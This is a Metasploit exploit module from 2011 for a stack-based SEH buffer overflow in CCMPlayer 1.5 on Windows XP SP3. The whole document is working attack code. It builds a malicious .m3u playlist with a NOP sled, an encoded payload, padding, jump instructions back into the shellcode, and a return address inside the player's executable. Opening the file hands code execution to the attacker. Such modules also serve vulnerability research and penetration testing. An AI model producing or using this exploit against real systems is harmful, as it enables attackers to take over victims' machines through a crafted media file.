# Date: 30 Nov 2011
# Author: Rh0
# Software: CCMPlayer 1.5
# Tested on: Windows XP SP3 32-Bit EN (VirtualBox)
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;CCMPlayer 1.5 Stack based Buffer Overflow (.m3u)&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a stack based buffer overflow in CCMPlayer 1.5. Opening
                a m3u playlist with a long track name, a SEH exception record can be overwritten
                with parts of the controllable buffer. SEH execution is triggered after an
                invalid read of an injectible address, thus allowing arbitrary code execution.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => [&#039;Rh0&#039;], # discovery and metasploit module
            &#039;Version&#039;        => &#039;0.0&#039;,
            &#039;References&#039;     =>
                [
                    # for info about "DisapleNops" and "StackAdjustment"
                    [&#039;URL&#039;, &#039;http://dev.metasploit.com/redmine/projects/framework/wiki/PortingExploits&#039;],
                    # for metasploit fileformat exploit structure and use of Metasm
                    [&#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/18142/&#039;]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;DisablePayloadHandler&#039; => &#039;true&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039; => 0x1000,
                    &#039;BadChars&#039; => "\x00\x0d\x0a\x1a\x2c\x2e\x3a\x5c", # \x00\r\n\x1a,.:\\
                    &#039;DisableNops&#039; => &#039;True&#039;,
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039;      => &#039;win&#039;,
            &#039;Targets&#039;       =>
                [
                    [
                        &#039;CCMPlayer 1.5 on Windows XP SP3 EN&#039;,
                        {
                            # pop esi / pop ebx / ret (in ccmplay.exe)
                            # tweak it if necessary
                            &#039;Ret&#039; => 0x00403ca7, # last NULL in buffer is accepted
                            &#039;Offset&#039; => 0x1000
                        }
                    ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;30 Nov 2011&#039;, # to my knowledge
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;msf.m3u&#039;]),
                ], self.class)
    end
 
    def exploit
 
        m3u = "C:\\"
        # shellcode
        m3u << Metasm::Shellcode.assemble(Metasm::Ia32.new, "nop").encode_string * 25
        m3u << payload.encoded
        # junk
        m3u << rand_text_alpha_upper(target[&#039;Offset&#039;] - (25 + payload.encoded.length))
        # need an access violation when reading next 4 bytes as address (0xFFFFFFFF)
        # to trigger SEH
        m3u << [0xffffffff].pack("V")
        # pad
        m3u << rand_text_alpha_upper(3)
        # long jmp: jmp far back to shellcode
        m3u << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-4103").encode_string
        # NSEH: jmp short back to long jmp instruction
        m3u << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-5").encode_string
        # pad (need more 2 bytes to fill up to 4, as jmp $-5 are only 2 bytes)
        m3u << rand_text_alpha_upper(2)
        # SEH Exception Handler Address -> p/p/r
        m3u << [target.ret].pack("V")
        m3u << ".mp3\r\n" # no crash without it
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
 
        # Open CCMPlayer -> Songs -> Add -> Files of type: m3u -> msf.m3u => exploit
        file_create(m3u)
 
    end
 
end



